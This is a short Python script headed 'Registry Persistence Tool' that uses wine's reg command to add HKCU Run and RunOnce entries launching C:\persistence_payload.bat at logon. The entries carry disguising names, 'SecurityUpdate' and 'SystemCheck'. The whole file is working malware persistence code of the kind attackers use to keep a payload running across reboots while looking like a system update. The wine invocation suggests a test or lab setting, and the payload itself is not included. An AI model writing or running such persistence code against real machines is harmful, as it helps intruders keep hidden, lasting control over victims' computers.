#!/usr/bin/env python3
import subprocess
import sys
import os

def add_run_key():
    """Add persistence via HKCU Run key"""
    try:
        # Registry path for current user Run key
        reg_path = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        # Command to add registry entry
        cmd = [
            'wine', 'reg', 'add', reg_path,
            '/v', 'SecurityUpdate',
            '/t', 'REG_SZ',
            '/d', 'C:\\persistence_payload.bat',
            '/f'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Successfully added Run key persistence")
            print(f"[+] Registry entry: {reg_path}\\SecurityUpdate")
        else:
            print(f"[-] Failed to add registry entry: {result.stderr}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

def add_runonce_key():
    """Add one-time persistence via HKCU RunOnce key"""
    try:
        # Registry path for current user RunOnce key
        reg_path = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        
        # Command to add registry entry
        cmd = [
            'wine', 'reg', 'add', reg_path,
            '/v', 'SystemCheck',
            '/t', 'REG_SZ',
            '/d', 'C:\\persistence_payload.bat',
            '/f'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print("[+] Successfully added RunOnce key persistence")
            print(f"[+] Registry entry: {reg_path}\\SystemCheck")
        else:
            print(f"[-] Failed to add registry entry: {result.stderr}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    print("=== Registry Persistence Tool ===")
    print("[*] Adding Run key persistence...")
    add_run_key()
    print("\n[*] Adding RunOnce key persistence...")
    add_runonce_key()
    print("\n[*] Persistence installation complete")
